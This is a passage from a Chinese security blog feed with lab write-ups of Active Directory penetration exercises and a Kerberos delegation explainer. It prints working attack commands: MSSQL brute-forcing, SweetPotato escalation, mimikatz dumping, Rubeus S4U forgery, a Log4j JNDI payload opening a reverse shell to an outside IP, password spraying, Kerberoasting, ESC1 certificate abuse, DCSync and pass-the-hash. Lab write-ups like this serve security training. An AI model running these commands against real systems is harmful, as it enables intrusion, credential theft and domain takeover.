class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m mssql -pwdf pass.txt</span><br><span class="line"></span><br><span class="line">/ _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">-m  mssql  start scan the port: 1433</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[+] mssql:172.22.2.16:1433:sa  ElGNkOiC</span><br><span class="line">已完成 1/1</span><br></pre></td></tr></table></figure><p>爆破出了这个172.22.2.16的服务器账号密码</p><p>于是尝试进行登录</p><p><strong>(这里使用的这个工具叫做MUDT)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>这里使用这个命令进行登录</p><p><img src="../images/image-20231002212509325.png" alt="image-20231002212509325"></p><p><img src="../images/image-20231002212533573.png" alt="image-20231002212533573"></p><p>成功连接该数据库 </p><p> 这里找遍了目录发现没有flag  于是猜测藏在这个Administrator用户里  于是尝试进行提权操作</p><p>这里的话尝试<code>SweetPotato.exe</code>来进行提权————-(<strong>刚开始写的时候有点懵  这里补充写一下为什么使用这个提权的原因</strong>)</p><blockquote><ul><li>第一点 </li></ul><p>就是我们这里登录是服务账户  并且是windows系统  (但这里并不能完全确认使用Potato这个工具)</p><ul><li>第二点</li></ul><p>就是我们使用了whoami /priv发现其开启了SeImpersonatePrivilege这个权限</p></blockquote><p><img src="../images/image-20231003144203530.png" alt="image-20231003144203530"></p><p><strong>(直接拿别人的图了  就不上靶机上重新演示了)</strong></p><blockquote><ul><li>以上两点刚好满足了我们使用potato的这个条件  于是这里我们就可以使用potato这个工具了</li></ul></blockquote><p><strong>以下是提权过程·</strong></p><ul><li>第一步</li></ul><p><img src="../images/image-20231002213023315.png" alt="image-20231002213023315"></p><ul><li>第二步</li></ul><p>上传<code>SweetPotato.exe</code>工具</p><p><img src="../images/image-20231002213209802.png" alt="image-20231002213209802"></p><ul><li>开始提权</li></ul><p><img src="../images/image-20231002213258829.png" alt="image-20231002213258829"></p><p>拿下管理员权限</p><p>因为不知道flag藏在哪  文件名也不知道  <strong>使用dir命令没有反应…….</strong></p><p><img src="../images/image-20231002213757844.png" alt="image-20231002213757844"></p><p>发现3389端口开着呢  于是我们使用管理员权限给本机添加个账号  并且加入本地管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net user Ke1nys qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators Ke1nys /add&quot;</span><br></pre></td></tr></table></figure><p>RDP进行连接</p><p><img src="../images/image-20231002214041936.png" alt="image-20231002214041936"></p><p>直接去访问这个<code>Administrator</code>用户</p><p><img src="../images/image-20231002214127329.png" alt="image-20231002214127329"></p><p>拿到第三个flag  </p><p>最后的话肯定是拿域控了</p><p>因为我们现在是本地管理员   可以有权限读取本地hash值  于是我们传入mimikatz进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><p>这里记得要以管理员的身份运行  否则会报错  </p><p><img src="../images/image-20231002214840666.png" alt="image-20231002214840666"></p><p>一个一个翻，可以翻到<code>MSSQLSERVER$</code>这个用户，MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控，并且似乎只有他的NTLM哈希可用，我们用Rubeus申请访问自身的服务票据</p><p><strong>(这里的话不使用bloodhound的原因就是我们新创建的用户只是本地管理员用户  并不是域用户  所以不能使用bloodhound这个东西来获取域内环境的联系)</strong></p><p>这里的话是使用<code>Rubeus</code>这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f05a1195c832a5d5bf080c8bed5ac227 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002215710933.png" alt="image-20231002215710933"></p><p><strong>抓到后伪造这个域管用户的ST  然后注入票据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002215954416.png" alt="image-20231002215954416"></p><p>成功注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><p><img src="../images/image-20231002220136592.png" alt="image-20231002220136592"></p><p>这里的话其实使用kekeo这工具也行其实</p><p><strong>偷张图  不知道他咋整的</strong></p><p><img src="../images/image-20231002223239748.png" alt="image-20231002223239748"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;h2 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Certify</title>
    <link href="https://ke1nys.github.io/posts/c964b814.html"/>
    <id>https://ke1nys.github.io/posts/c964b814.html</id>
    <published>2023-09-29T08:36:18.000Z</published>
    <updated>2023-10-07T14:29:22.121Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到ip后还是先使用fscan进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 39.98.127.239 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929164056646.png" alt="image-20230929164056646"></p><p>8983端口开了这个服务  是solr</p><p><img src="../images/image-20230929164158696.png" alt="image-20230929164158696"></p><p>查看到版本号  于是Google查找</p><p><a href="https://zgao.top/cve-2021-44228-apache-log4j2-lookup-jndi-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">找了这篇文章  于是进行getshell操作</a></p><p>先测试是否存在这个漏洞</p><p><img src="../images/image-20230929164658642.png" alt="image-20230929164658642"></p><p><img src="../images/image-20230929164707027.png" alt="image-20230929164707027"></p><p>漏洞存在进行getshell操作</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>这里的话使用这个工具</p><blockquote><p>JNDIExploit-1.3-SNAPSHOT.jar    <a href="https://github.com/WhiteHSBG/JNDIExploit/releases">https://github.com/WhiteHSBG/JNDIExploit/releases</a></p></blockquote><p><img src="../images/image-20230929164938220.png" alt="image-20230929164938220"></p><p>在自己的vps上启动</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://101.42.39.110:1389/Basic/ReverseShell/101.42.39.110/3389&#125;</span><br></pre></td></tr></table></figure><p><strong>记得把端口给打开</strong></p><p>然后监听3389端口</p><p><img src="../images/image-20230929165107113.png" alt="image-20230929165107113"></p><p>成功  并且成功弹到了shell</p><p>这里查看了一下根目录和home目录  发现没有flag于是就猜测要提权了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里的话就常规三件套了 </p><p><strong>sudo suid 内核  挨个找就行了</strong></p><p><img src="../images/image-20230929165527023.png" alt="image-20230929165527023"></p><p>刚好发现一个以root命令执行的命令  并且不需要密码</p><p><img src="../images/image-20230929165737722.png" alt="image-20230929165737722"></p><p>然后直接找flag</p><p><img src="../images/image-20230929165821122.png" alt="image-20230929165821122"></p><p>然后直接读取就行了</p><p><img src="../images/image-20230929165924783.png" alt="image-20230929165924783"></p><p>接下来就开始内网渗透了</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先查看内网ip</p><p><img src="../images/image-20230929170013233.png" alt="image-20230929170013233"></p><p>wget传一个fscan进行开扫  <strong>(记得传到tmp目录下 因为这个目录下的权限高)</strong></p><p><img src="../images/image-20230929170712698.png" alt="image-20230929170712698"></p><p>一共发现了这些信息  </p><blockquote><p>172.22.9.7 ——-&gt; 域控主机   3389</p><p>172.22.9.19   —-&gt;  linux服务器</p><p>172.22.9.26 ——&gt;  普通域用户  3389</p><p>172.22.9.47  ——&gt;  apache</p></blockquote><p>于是先从这个使用了apache来搭建的fileserver的地址来入手</p><h3 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h3><p>这里用的是chisel这个工具</p><p><strong>(在代理的那篇文章里有讲到)</strong></p><blockquote><p> ./chisel server -p 1234 —reverse       //vps上运行</p><p>  ./chisel client 101.42.39.110:1234 R:0.0.0.0:7777:socks     //getshell主机上运行</p></blockquote><p><img src="../images/image-20230929171459695.png" alt="image-20230929171459695"></p><p>成功挂上了代理</p><p><strong>(这里的proxychains和proxifier自己百度解决就行)</strong></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>然后扫描的时候发现了  这个47这台机器开启了445  然后又扫到了这个fileserver服务</p><p>直接无密码登录smb试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient -L 172.22.9.47</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929172011893.png" alt="image-20230929172011893"></p><p>发现可以无密码登录</p><p>于是就去查看他的文件共享文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient //172.22.9.47/fileshare</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929172231585.png" alt="image-20230929172231585"></p><p>然后使用get命令下载到本地就行了</p><p><img src="../images/image-20230929172316062.png" alt="image-20230929172316062"></p><p>发现给了个SPN的提示   <strong>(先不管  遇到再说)</strong></p><p>在查看文件共享的时候  还发现了个person.db这个文件夹  于是下载到本地进行查看</p><p><img src="../images/image-20230929172834723.png" alt="image-20230929172834723"></p><p>发现了存在四个表</p><ul><li><strong>User表</strong></li></ul><p><img src="../images/image-20230929172909693.png" alt="image-20230929172909693"></p><p>存在了三个用户的密码</p><ul><li><strong>Members表</strong></li></ul><p><img src="../images/image-20230929172953874.png" alt="image-20230929172953874"></p><p><strong>这个表是存在了域里用户的表  (不知道是不是全部)</strong></p><p>然后我们尝试将用户名全部提取出来进行密码喷洒攻击  来找到可以利用用户的账号密码</p><ul><li><strong>提取脚本</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开原始数据文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取指定字符串</span></span><br><span class="line">users = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\w+)@xiaorang.lab&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存提取后的字符串到 user.txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        file.write(user + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>1.txt直接把members整个表复制进去就行</p><p><img src="../images/image-20230929173220039.png" alt="image-20230929173220039"></p><p>运行之后就会得到所有的用户   </p><p>然后使用这个<code>kerbrute_windows_amd64.exe</code>工具进行密码喷洒攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt i9XDE02pLVf</span><br><span class="line"></span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt 6N70jt2K9sV</span><br><span class="line"></span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt fiAzGwEMgTY</span><br></pre></td></tr></table></figure><blockquote><p>2023/09/29 17:44:29 &gt;  [+] VALID LOGIN:  liupeng@xiaorang.lab:fiAzGwEMgTY</p><p>2023/09/29 17:44:04 &gt;  [+] VALID LOGIN:  zhangjian@xiaorang.lab:i9XDE02pLVf</p></blockquote><p>一共就是爆破出这个两个账号  因为上面提示了SPN  于是我们可以枚举一下域里的SPN</p><p><strong>(先是RDP失败了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929175030774.png" alt="image-20230929175030774"></p><p>不适用-request的话 是只返回域中的所有SPN  包括服务账户  服务主机</p><p>这里使用-request来请求返回域中所有SPN的hash值  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一般情况下，SPN 的哈希值是根据服务账户的名称生成的，因此可以认为 SPN 的哈希值包含了该服务账户的信息。哈希值是通过对服务账户名称进行哈希运算而得到的固定长度的字符串。</span><br></pre></td></tr></table></figure><p>于是我们尝试爆破服务用户的服务票据   </p><p><img src="../images/image-20230929175802046.png" alt="image-20230929175802046"></p><p>(这里的爆破类型是13100)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929180309246.png" alt="image-20230929180309246"></p><p>爆破成功</p><p><code>zhangxia–MyPass2@@6</code></p><p>尝试rdp登录  </p><p><strong>(这里使用RDP的话注意一点   用户名要这样写<code>zhangxia@XIAORANG.LAB</code>    后面跟着域)</strong></p><p><img src="../images/image-20230929180713709.png" alt="image-20230929180713709"></p><p><strong>成功登录  直接线上sharphood进去收集一下域的信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab --ExcludeDCs</span><br></pre></td></tr></table></figure><p>然后将压缩包复制出来  拖到这个bloodhound里进行分析</p><p><img src="../images/image-20230929180904838.png" alt="image-20230929180904838"></p><p>RBCD条件反应  但是这里题目考察的是CS证书  所以这里没尝试</p><p>这里使用的工具是<code>Certify.exe</code>这个工具  于是尝试进行利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929181907979.png" alt="image-20230929181907979"></p><p>发现确实是存在这个证书模板可以利用</p><p>这里要成功利用要满足三个点<br>1、我们需要有权限去获取证书<br>2、能够登记为客户端身份验证或智能卡登录等<br>3、CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT开启</p><p><strong>(证书可以用于身份验证  所以就是为什么可以利用的原因)</strong></p><p><img src="../images/image-20230929182437803.png" alt="image-20230929182437803"></p><p><img src="../images/80cd55f56f02f549d69e71fa2af90b55.png" alt="img"></p><p>域渗透中和证书服务器相关的利用有ESC1和ESC8  这个exe文件这里没有写  我们拿linux的certify工具进行尝试尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27;  -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p>发现域渗透中和证书服务器相关的利用有<code>ESC1</code>和<code>ESC8</code></p><p>这里的话就只存在这个<code>ESC1</code></p><p>开始申请 <code>XR Manager</code> 证书模版并伪造域管理员</p><p><img src="../images/image-20230929183202464.png" alt="image-20230929183202464"></p><p>两个关键参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:&quot;XR Manager&quot; /altname:XIAORANG.LAB\Administrator</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929183345036.png" alt="image-20230929183345036"></p><p>这里伪造的是域管理员账户  </p><p>新建一个cert.pem  然后把内容复制进去</p><p>然后使用openssl转成pfx文件  就是证书</p><p><strong>(这里转的话在cert.pem内容下面有指令)</strong></p><p><strong>tmd  这里折磨了我好几个小时  因为这个转化的是使用openssl—v1.1版本才行  wtmc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929184411146.png" alt="image-20230929184411146"></p><p>然后将pfx文件复制rdp主机里</p><p>然后使用<code>Rubeus.exe</code>工具来请求票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password: /ptt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929184709538.png" alt="image-20230929184709538"></p><p>请求域管理员的TGT成功  那么接下来就是想干啥干啥了</p><p><img src="../images/image-20230929184914327.png" alt="image-20230929184914327"></p><p>然后使用mimikatz.exe来获取hash值</p><p><strong>Dc’Sync攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929185431206.png" alt="image-20230929185431206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.9.26 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line">//ntlm的pth攻击</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929185650939.png" alt="image-20230929185650939"></p><p>接下来到域控这台主机了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes 00000000000000000000000000000000:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7</span><br></pre></td></tr></table></figure><p>//hash值的话就是我们前面获取的那个  然后在前面补0就行了</p><p><img src="../images/image-20230929190925467.png" alt="image-20230929190925467"></p><p>成功拿下这台域控</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;拿到ip后还是先使用fscan进行扫描&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;t</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-约束委派与非约束委派</title>
    <link href="https://ke1nys.github.io/posts/bf224af2.html"/>
    <id>https://ke1nys.github.io/posts/bf224af2.html</id>
    <published>2023-09-29T08:00:26.000Z</published>
    <updated>2023-10-10T02:39:43.444Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7083788949482635271#heading-7">参考文章1</a>  <a href="https://xz.aliyun.com/t/7217#toc-9">参考文章—xz社区</a></p><p>这个是在打春秋云镜的Certify的靶机的时候遇到的知识点  上一篇是写了RBCD  现在的话把其他两个补齐</p><p><strong>(这里的话复现的话就直接搬别人的截图了  这里就不搭建环境复现了)</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这里的话  怎么发现约束委派和非约束委派的用户和计算机就不写了</p><p>就写利用方式</p><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><ul><li><p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></p></li><li><p>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</p></li></ul><p>发现域中委派的用户或计算机一般使用的手段是通过<code>LDAP</code>协议（全称：<code>LightweightDirectory Access Protocol</code>）然后通过<code>userAccountControl</code>属性筛选出符合的用户或计算机，我们可以通过<code>ADSI</code>（全称：<code>ActiveDirectory Service Interfaces Editor</code>）来编辑和修改LDAP，<code>adsiedit.msc</code>可以打开<code>ADSI</code>编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到<code>userAccountControl</code>属性包含了<code>TRUSTED_FOR_DELEGATION</code></p><p><img src="../images/image-20230930153644543.png" alt="image-20230930153644543"></p><p>然后我们再看一下约束委派的用户，同样它的<code>userAccountControl</code>属性包含了<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，但是它比非约束委派的用户多了一个<code>msDS-AllowedToDelegateTo</code>属性，里面包含了允许委派的服务</p><p><img src="../images/image-20230930153759579.png" alt="image-20230930153759579"></p><blockquote><p>注意 ： 委派的用户只能是————————-主机用户和服务用户</p></blockquote><h2 id="为什么需要域委派"><a href="#为什么需要域委派" class="headerlink" title="为什么需要域委派"></a>为什么需要域委派</h2><p>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br> 用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。</p><h2 id="域委派流程"><a href="#域委派流程" class="headerlink" title="域委派流程"></a>域委派流程</h2><p><img src="../images/fc96bf11139c4826a7b810c44799622btplv-k3u1fbpfcp-zoom-in-crop-mark1512000.awebp" alt="img"></p><p> 一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行 WEB服务的服务账号websvc模拟(Impersonate)用户 jack，以Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中单跳或者多跳的Kerberos认证。</p><ul><li><p>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器;</p></li><li><p>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请;</p></li><li><p>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据 TGT;</p></li><li><p>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据ST;</p></li><li><p>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据 ST;</p></li><li><p>websvc收到的jack用户的授权票据ST后，可访问文件服务，完成多跳认证。</p></li></ul><h2 id="委派类型"><a href="#委派类型" class="headerlink" title="委派类型"></a>委派类型</h2><p>一是<strong>非约束性委派(Unconstrained Delegation)</strong> ，服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户<strong>访问<code>任意服务</code></strong></p><p>二是<strong>约束性委派(Constrained Delegation)</strong> ，即Kerberos的扩展协议 <code>S4U2Proxy</code>，服务账号只能获取某用户的ST，从而只能模拟用户<strong>访问特定的服务</strong></p><h2 id="非约束委派的利用"><a href="#非约束委派的利用" class="headerlink" title="非约束委派的利用"></a>非约束委派的利用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p><p>非约束委派的请求过程（图来自微软手册）：</p><p><img src="../images/image-20230930155439169.png" alt="image-20230930155439169"></p><p>上图的Kerberos请求描述分为如下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。</span><br><span class="line"></span><br><span class="line">2. KDC在`KRB_AS_REP`消息中返回`TGT1`。</span><br><span class="line"></span><br><span class="line">3. 用户根据步骤2中的TGT1请求转发TGT2。</span><br><span class="line"></span><br><span class="line">4. KDC在KRB_TGS_REP消息中为user返回TGT2。</span><br><span class="line"></span><br><span class="line">5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）</span><br><span class="line"></span><br><span class="line">6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。</span><br><span class="line"></span><br><span class="line">7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey</span><br><span class="line"></span><br><span class="line">8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。</span><br><span class="line"></span><br><span class="line">9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。</span><br><span class="line"></span><br><span class="line">10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。</span><br><span class="line"></span><br><span class="line">11. service2响应service1的请求。</span><br><span class="line"></span><br><span class="line">12. 有了这个响应，service1就可以在步骤7中响应用户的请求。</span><br><span class="line"></span><br><span class="line">13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。</span><br><span class="line"></span><br><span class="line">14. KDC返回步骤13中请求的ST</span><br><span class="line"></span><br><span class="line">15-16. 